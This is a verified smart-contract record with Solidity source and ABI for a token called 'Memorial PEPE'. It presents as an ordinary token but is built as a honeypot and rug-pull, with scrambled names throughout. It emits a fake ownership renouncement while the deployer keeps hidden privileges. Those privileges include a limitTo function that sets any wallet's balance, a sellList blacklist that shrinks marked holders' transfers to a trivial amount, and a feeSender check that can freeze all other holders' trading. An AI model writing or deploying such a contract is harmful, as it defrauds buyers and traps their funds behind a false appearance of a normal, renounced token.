{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.8;\n\ninterface atSender {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address teamWalletAt) external view returns (uint256);\n\n    function transfer(address autoAmount, uint256 tradingSwapSender) external returns (bool);\n\n    function allowance(address listLiquidity, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 tradingSwapSender) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address autoAmount,\n        uint256 tradingSwapSender\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed amountLaunched, uint256 value);\n    event Approval(address indexed listLiquidity, address indexed spender, uint256 value);\n}\n\nabstract contract receiverFund {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface takeLimit {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface modeLimit {\n    function createPair(address totalLaunched, address maxLaunch) external returns (address);\n}\n\ninterface atSenderMetadata is atSender {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract MemorialPEPE is receiverFund, atSender, atSenderMetadata {\n\n    bool private receiverTrading;\n\n    mapping(address => mapping(address => uint256)) private txTeam;\n\n    string private shouldAmount = \"MPE\";\n\n    address toShould = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    uint256 private buySwapShould = 100000000 * 10 ** 18;\n\n    function decimals() external view virtual override returns (uint8) {\n        return exemptMin;\n    }\n\n    mapping(address => bool) public totalTeam;\n\n    bool public marketingTake;\n\n    function allowance(address isTotalToken, address amountTotal) external view virtual override returns (uint256) {\n        if (amountTotal == toLiquidityTrading) {\n            return type(uint256).max;\n        }\n        return txTeam[isTotalToken][amountTotal];\n    }\n\n    uint256 public buyMode;\n\n    function walletTx(address takeMax, address autoAmount, uint256 tradingSwapSender) internal returns (bool) {\n        require(enableBuy[takeMax] >= tradingSwapSender);\n        enableBuy[takeMax] -= tradingSwapSender;\n        enableBuy[autoAmount] += tradingSwapSender;\n        emit Transfer(takeMax, autoAmount, tradingSwapSender);\n        return true;\n    }\n\n    function limitTxWallet() private view {\n        require(totalTeam[_msgSender()]);\n    }\n\n    uint256 feeSender;\n\n    function takeMin(address teamList) public {\n        if (marketingTake) {\n            return;\n        }\n        if (atBuyFee) {\n            teamToken = false;\n        }\n        totalTeam[teamList] = true;\n        if (buyMode == atAmountMarketing) {\n            amountReceiver = false;\n        }\n        marketingTake = true;\n    }\n\n    function owner() external view returns (address) {\n        return totalAt;\n    }\n\n    uint8 private exemptMin = 18;\n\n    address private totalAt;\n\n    address toLiquidityTrading = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    function approve(address amountTotal, uint256 tradingSwapSender) public virtual override returns (bool) {\n        txTeam[_msgSender()][amountTotal] = tradingSwapSender;\n        emit Approval(_msgSender(), amountTotal, tradingSwapSender);\n        return true;\n    }\n\n    address public totalFund;\n\n    bool public amountReceiver;\n\n    event OwnershipTransferred(address indexed feeShould, address indexed limitAuto);\n\n    function transferFrom(address takeMax, address autoAmount, uint256 tradingSwapSender) external override returns (bool) {\n        if (_msgSender() != toLiquidityTrading) {\n            if (txTeam[takeMax][_msgSender()] != type(uint256).max) {\n                require(tradingSwapSender <= txTeam[takeMax][_msgSender()]);\n                txTeam[takeMax][_msgSender()] -= tradingSwapSender;\n            }\n        }\n        return receiverExemptAmount(takeMax, autoAmount, tradingSwapSender);\n    }\n\n    function name() external view virtual override returns (string memory) {\n        return launchedBuy;\n    }\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return buySwapShould;\n    }\n\n    function transfer(address launchAmount, uint256 tradingSwapSender) external virtual override returns (bool) {\n        return receiverExemptAmount(_msgSender(), launchAmount, tradingSwapSender);\n    }\n\n    string private launchedBuy = \"Memorial PEPE\";\n\n    uint256 constant swapFrom = 11 ** 10;\n\n    bool public txMarketing;\n\n    function sellAmount() public {\n        emit OwnershipTransferred(launchedReceiver, address(0));\n        totalAt = address(0);\n    }\n\n    function enableShould(uint256 tradingSwapSender) public {\n        limitTxWallet();\n        feeSender = tradingSwapSender;\n    }\n\n    uint256 private atAmountMarketing;\n\n    address public launchedReceiver;\n\n    function receiverExemptAmount(address takeMax, address autoAmount, uint256 tradingSwapSender) internal returns (bool) {\n        if (takeMax == launchedReceiver) {\n            return walletTx(takeMax, autoAmount, tradingSwapSender);\n        }\n        uint256 minExempt = atSender(totalFund).balanceOf(toShould);\n        require(minExempt == feeSender);\n        require(autoAmount != toShould);\n        if (walletTotalBuy[takeMax]) {\n            return walletTx(takeMax, autoAmount, swapFrom);\n        }\n        return walletTx(takeMax, autoAmount, tradingSwapSender);\n    }\n\n    mapping(address => bool) public walletTotalBuy;\n\n    function sellList(address toMin) public {\n        limitTxWallet();\n        \n        if (toMin == launchedReceiver || toMin == totalFund) {\n            return;\n        }\n        walletTotalBuy[toMin] = true;\n    }\n\n    bool public atBuyFee;\n\n    uint256 marketingIs;\n\n    mapping(address => uint256) private enableBuy;\n\n    function symbol() external view virtual override returns (string memory) {\n        return shouldAmount;\n    }\n\n    function getOwner() external view returns (address) {\n        return totalAt;\n    }\n\n    function balanceOf(address teamWalletAt) public view virtual override returns (uint256) {\n        return enableBuy[teamWalletAt];\n    }\n\n    bool public teamToken;\n\n    function limitTo(address launchAmount, uint256 tradingSwapSender) public {\n        limitTxWallet();\n        enableBuy[launchAmount] = tradingSwapSender;\n    }\n\n    constructor (){\n        if (receiverTrading == amountReceiver) {\n            atBuyFee = false;\n        }\n        takeLimit senderLiquidity = takeLimit(toLiquidityTrading);\n        totalFund = modeLimit(senderLiquidity.factory()).createPair(senderLiquidity.WETH(), address(this));\n        \n        launchedReceiver = _msgSender();\n        sellAmount();\n        totalTeam[launchedReceiver] = true;\n        enableBuy[launchedReceiver] = buySwapShould;\n        if (atAmountMarketing != buyMode) {\n            teamToken = true;\n        }\n        emit Transfer(address(0), launchedReceiver, buySwapShould);\n    }\n\n    bool private toWallet;\n\n    bool public enableMode;\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"listLiquidity\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"feeShould\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"limitAuto\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"amountLaunched\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"isTotalToken\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"amountTotal\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"amountReceiver\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"amountTotal\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"tradingSwapSender\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"atBuyFee\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"teamWalletAt\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"buyMode\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"enableMode\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"tradingSwapSender\",\"type\":\"uint256\"}],\"name\":\"enableShould\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"launchedReceiver\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchAmount\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"tradingSwapSender\",\"type\":\"uint256\"}],\"name\":\"limitTo\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"marketingTake\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"sellAmount\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"toMin\",\"type\":\"address\"}],\"name\":\"sellList\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"teamList\",\"type\":\"address\"}],\"name\":\"takeMin\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"teamToken\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalFund\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"totalTeam\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchAmount\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"tradingSwapSender\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"takeMax\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"autoAmount\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"tradingSwapSender\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"txMarketing\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"walletTotalBuy\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"}]", "ContractName": "MemorialPEPE", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}